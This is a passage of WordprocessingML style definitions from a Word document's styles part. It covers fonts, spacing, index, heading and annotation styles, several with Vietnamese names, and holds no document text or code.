  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00DF3355"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="1700"/>
        <w:tab w:val="right" w:leader="dot" w:pos="9100"/>
      </w:tabs>
      <w:ind w:left="1700" w:hanging="706"/>
    </w:pPr>
    <w:rPr>
      <w:noProof/>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rFonts w:ascii="Arial Unicode MS" w:hAnsi="Arial Unicode MS" w:cs="Arial Unicode MS"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:qFormat/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextIndent">
    <w:name w:val="Body Text Indent"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:spacing w:line="480" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BodyTextIndent2">
    <w:name w:val="Body Text Indent 2"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:spacing w:line="480" w:lineRule="auto"/>
      <w:ind w:left="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:semiHidden/>
    <w:rsid w:val="0011066B"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:semiHidden/>
    <w:rsid w:val="0011066B"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:semiHidden/>
    <w:rsid w:val="0011066B"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:semiHidden/>
    <w:rsid w:val="0011066B"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Chuthich">
    <w:name w:val="Chu thich"/>
    <w:basedOn w:val="Caption"/>
    <w:autoRedefine/>
    <w:rsid w:val="00A4617C"/>
    <w:rPr>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Picturenotes">
    <w:name w:val="Picture notes"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:rsid w:val="00464B3F"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Arial"/>
      <w:i/>
      <w:sz w:val="18"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Notes">
    <w:name w:val="Notes"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="NotesChar"/>
    <w:rsid w:val="00E855CD"/>
    <w:rPr>
      <w:rFonts w:cs="Arial"/>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="005606EF"/>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sChar">
    <w:name w:val="Notes Char"/>
    <w:link w:val="Notes"/>
    <w:rsid w:val="00394129"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:i/>
      <w:iCs/>
      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:rsid w:val="00F2589B"/>
    <w:rPr>
      <w:color w:val="800080"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HighlightedVariable">
    <w:name w:val="Highlighted Variable"/>
    <w:rsid w:val="00746304"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index1B">
    <w:name w:val="Index 1B"/>
    <w:basedOn w:val="Index1"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:rsid w:val="0057646D"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index2B">
    <w:name w:val="Index 2B"/>
    <w:basedOn w:val="Index2"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:rsid w:val="003325DD"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index3B">
    <w:name w:val="Index 3B"/>
    <w:basedOn w:val="Index3"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:rsid w:val="00415C25"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Index4">
    <w:name w:val="index 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00BF0431"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index4B">
    <w:name w:val="Index 4B"/>
    <w:basedOn w:val="Index4"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:rsid w:val="00BF0431"/>
    <w:rPr>
      <w:b/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CharCharCharChar">
    <w:name w:val="Char Char Char Char"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00CC3B6C"/>
    <w:pPr>
      <w:spacing w:after="160" w:line="240" w:lineRule="exact"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
      <w:color w:val="0000FF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Normal1">
    <w:name w:val="Normal1"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="normalChar"/>
    <w:rsid w:val="004D2250"/>
    <w:pPr>
      <w:suppressAutoHyphens/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="normalChar">
    <w:name w:val="normal Char"/>
    <w:link w:val="Normal1"/>
    <w:rsid w:val="004D2250"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:lang w:val="en-US" w:eastAsia="ar-SA" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Style5">
    <w:name w:val="Style5"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="004D2250"/>
    <w:pPr>
      <w:keepLines/>
      <w:numPr>
        <w:numId w:val="6"/>
      </w:numPr>
      <w:suppressAutoHyphens/>
      <w:spacing w:before="60"/>
    </w:pPr>
    <w:rPr>
      <w:bCs/>
      <w:iCs/>
      <w:lang w:val="vi-VN" w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Index1Char1">
    <w:name w:val="Index 1 Char1"/>
    <w:aliases w:val="Chi muc cap 1 Char1,Index 1 Char Char,Chi muc cap 1 Char Char Char,Index 1 Char1 Char Char Char1 Char Char Char Char Char,Index 1 Char1 Char1 Char Char Char Char Char Char Char Char Char, Char Char"/>
    <w:link w:val="Index1"/>
    <w:semiHidden/>
    <w:rsid w:val="004D2250"/>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Heading31">
    <w:name w:val="Heading 31"/>
    <w:basedOn w:val="Heading3"/>
    <w:rsid w:val="004D2250"/>
    <w:pPr>
      <w:keepNext/>
      <w:widowControl w:val="0"/>
      <w:overflowPunct w:val="0"/>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:adjustRightInd w:val="0"/>
      <w:spacing w:before="0" w:line="340" w:lineRule="atLeast"/>
      <w:textAlignment w:val="baseline"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Times New Roman"/>
      <w:caps w:val="0"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:u w:val="words"/>
      <w:lang w:eastAsia="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextChar">
    <w:name w:val="Body Text Char"/>
    <w:aliases w:val="bt Char,body text Char,BODY TEXT Char,t Char"/>
    <w:link w:val="BodyText"/>
    <w:rsid w:val="00FD59FE"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Helvetica"/>
      <w:color w:val="000000"/>
      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CharChar">
    <w:name w:val="Char Char"/>
    <w:rsid w:val="003325DD"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Helvetica"/>
      <w:color w:val="000000"/>
      <w:lang w:val="vi-VN" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="StyleBulleted">
    <w:name w:val="Style Bulleted"/>
    <w:basedOn w:val="NoList"/>
    <w:rsid w:val="003325DD"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="7"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Index2Char">
    <w:name w:val="Index 2 Char"/>
    <w:aliases w:val="Index 2 Char2 Char Char,Index 2 Char1 Char Char Char,Index 2 Char Char Char Char Char Char Char,Index 2 Char Char Char Char1 Char Char,Index 2 Char Char Char Char1 Char Char Char Char,Index 2 Char1 Char1 Char,Chi muc cap 2 Char Char"/>
    <w:link w:val="Index2"/>
    <w:semiHidden/>
    <w:rsid w:val="003325DD"/>
    <w:rPr>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index1B0">
    <w:name w:val="Index 1 B"/>
    <w:basedOn w:val="Index1"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:rsid w:val="00DA629F"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="432"/>
      </w:tabs>
      <w:ind w:left="432" w:hanging="432"/>
    </w:pPr>
    <w:rPr>
      <w:bCs/>
      <w:color w:val="000000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BulletTable">
    <w:name w:val="Bullet Table"/>
    <w:basedOn w:val="Index2"/>
    <w:link w:val="BulletTableCharChar"/>
    <w:autoRedefine/>
    <w:rsid w:val="00CD67C4"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="8"/>
      </w:numPr>
      <w:spacing w:before="60"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BulletTableCharChar">
    <w:name w:val="Bullet Table Char Char"/>
    <w:link w:val="BulletTable"/>
    <w:rsid w:val="00CD67C4"/>
    <w:rPr>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index2B0">
    <w:name w:val="Index 2 B"/>
    <w:basedOn w:val="Index2"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:rsid w:val="006459E9"/>
    <w:rPr>
      <w:color w:val="auto"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Index11">
    <w:name w:val="Index 11"/>
    <w:basedOn w:val="Index1"/>
    <w:link w:val="index1CharChar"/>
    <w:rsid w:val="006459E9"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="9"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="5342"/>
        <w:tab w:val="right" w:pos="7400"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:color w:val="000000"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="StyleJustified">
    <w:name w:val="Style Justified"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="000E74C3"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="10"/>
      </w:numPr>
      <w:jc w:val="both"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Default">
    <w:name w:val="Default"/>
    <w:rsid w:val="00685513"/>
    <w:pPr>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:adjustRightInd w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="small">
    <w:name w:val="small"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="002A4D20"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Char1CharCharChar1">
    <w:name w:val="Char1 Char Char Char1"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00726856"/>
    <w:pPr>
      <w:pageBreakBefore/>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00C83F4F"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:link w:val="Heading5"/>
    <w:rsid w:val="007967A5"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:color w:val="0000FF"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Hinhve">
    <w:name w:val="Hinh ve"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HinhveCharChar"/>
    <w:rsid w:val="00B6067C"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="11"/>
      </w:numPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HinhveCharChar">
    <w:name w:val="Hinh ve Char Char"/>
    <w:link w:val="Hinhve"/>
    <w:rsid w:val="00B6067C"/>
    <w:rPr>
      <w:i/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="DefaultText">
    <w:name w:val="Default Text"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00B6067C"/>
    <w:rPr>
      <w:rFonts w:ascii="TimesNewRomanPS" w:hAnsi="TimesNewRomanPS"/>
      <w:noProof/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="bullet1Char">
    <w:name w:val="bullet1 Char"/>
    <w:basedOn w:val="Normal"/>
    <w:semiHidden/>
    <w:rsid w:val="00B6067C"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="1152"/>
      </w:tabs>
      <w:spacing w:before="60" w:after="60" w:line="320" w:lineRule="atLeast"/>
      <w:jc w:val="both"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="index1CharChar">
    <w:name w:val="index 1 Char Char"/>
    <w:link w:val="Index11"/>
    <w:rsid w:val="00B6067C"/>
    <w:rPr>
      <w:color w:val="000000"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="vi-VN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Norm">
    <w:name w:val="Norm"/>
    <w:link w:val="NormChar"/>
    <w:rsid w:val="00843824"/>
    <w:pPr>
      <w:spacing w:before="120"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="000000"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="NBullet1">
    <w:name w:val="N Bullet 1"/>
    <w:basedOn w:val="Norm"/>
    <w:rsid w:val="00843824"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="576"/>
      </w:tabs>
      <w:ind w:left="576" w:hanging="288"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="NormChar">
    <w:name w:val="Norm Char"/>
    <w:link w:val="Norm"/>
    <w:rsid w:val="00843824"/>
    <w:rPr>
      <w:color w:val="000000"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:link w:val="Heading1"/>
    <w:rsid w:val="002A4F04"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="0000FF"/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:link w:val="Heading2"/>
    <w:rsid w:val="007967A5"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:caps/>
      <w:color w:val="0000FF"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BodyText0">
    <w:name w:val="BodyText"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BodyTextChar0"/>
    <w:rsid w:val="00887754"/>
    <w:pPr>
      <w:spacing w:line="360" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="BodyTextChar0">
    <w:name w:val="BodyText Char"/>
    <w:link w:val="BodyText0"/>
    <w:rsid w:val="00887754"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Chimuccap1CharCharCharCharCharCharCharCharCharCharCharChar">
    <w:name w:val="Chi muc cap 1 Char Char Char Char Char Char Char Char Char Char Char Char"/>
    <w:aliases w:val="Chi muc cap 1 Char Char Char Char Char Char Char Char Char Char Char1,Chi muc cap 1 Char Char Char Char,Chi muc cap 1 Char Char Char1,Chi muc cap 1 Char"/>
    <w:rsid w:val="00887754"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:bCs/>
      <w:lang w:val="fr-FR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="DocumentMap">
    <w:name w:val="Document Map"/>
    <w:basedOn w:val="Normal"/>
    <w:semiHidden/>
    <w:rsid w:val="00F723C4"/>
    <w:pPr>
      <w:shd w:val="clear" w:color="auto" w:fill="000080"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CharCharCharChar0">
    <w:name w:val="Char Char Char Char"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00EC2499"/>
    <w:pPr>
      <w:spacing w:after="160" w:line="240" w:lineRule="exact"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="detail">
    <w:name w:val="detail"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00082A19"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="doctext">
    <w:name w:val="doctext"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00F439E7"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="docemphstrong">
    <w:name w:val="docemphstrong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00F439E7"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="doclist">
    <w:name w:val="doclist"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="002E1FE3"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:rsid w:val="000C4623"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="topiclinefirst">
    <w:name w:val="topiclinefirst"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00FC4F25"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="topicline">
    <w:name w:val="topicline"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="000460CF"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="outlinenumber">
    <w:name w:val="outlinenumber"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="0000158B"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:aliases w:val="lp1,List Paragraph2,Bullet_1,List Paragraph 1,List Paragraph-rfp content,bullet,List Paragraph level1,Normal_ List Paragraph - 1,List Paragraph11,Nga 3,Đoạn của Danh sách,liet ke,lp11,Bullet L1,Colorful List - Accent 11,CONTENT,b1"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00EC0818"/>
    <w:pPr>
      <w:spacing w:after="200"/>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Bullets">
    <w:name w:val="Bullets"/>
    <w:rsid w:val="00E6405F"/>
    <w:rPr>
      <w:rFonts w:ascii="OpenSymbol" w:eastAsia="OpenSymbol" w:hAnsi="OpenSymbol" w:cs="OpenSymbol"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="EndnoteText">
    <w:name w:val="endnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="EndnoteTextChar"/>
    <w:rsid w:val="009A5AD3"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="EndnoteTextChar">
    <w:name w:val="Endnote Text Char"/>
    <w:link w:val="EndnoteText"/>
    <w:rsid w:val="009A5AD3"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Helvetica"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="EndnoteReference">
    <w:name w:val="endnote reference"/>
    <w:rsid w:val="009A5AD3"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="apple-converted-space">
    <w:name w:val="apple-converted-space"/>
    <w:rsid w:val="00653D73"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Content">
    <w:name w:val="Content"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="ContentChar"/>
    <w:rsid w:val="00541B7A"/>
    <w:pPr>
      <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="ContentChar">
    <w:name w:val="Content Char"/>
    <w:link w:val="Content"/>
    <w:rsid w:val="00541B7A"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="007E7919"/>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00DE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uiPriority w:val="99"/>
    <w:rsid w:val="00DE7427"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="start-tag">
    <w:name w:val="start-tag"/>
    <w:rsid w:val="00DE7427"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="attribute-name">
    <w:name w:val="attribute-name"/>
    <w:rsid w:val="00DE7427"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="error">
    <w:name w:val="error"/>
    <w:rsid w:val="00DE7427"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="end-tag">
    <w:name w:val="end-tag"/>
    <w:rsid w:val="00DE7427"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="tableheadercell">
    <w:name w:val="tableheadercell"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="0038132D"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:adjustRightInd w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:color w:val="000000"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:link w:val="Heading3"/>
    <w:rsid w:val="007967A5"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:color w:val="0000FF"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Request-Payload">
    <w:name w:val="Request-Payload"/>
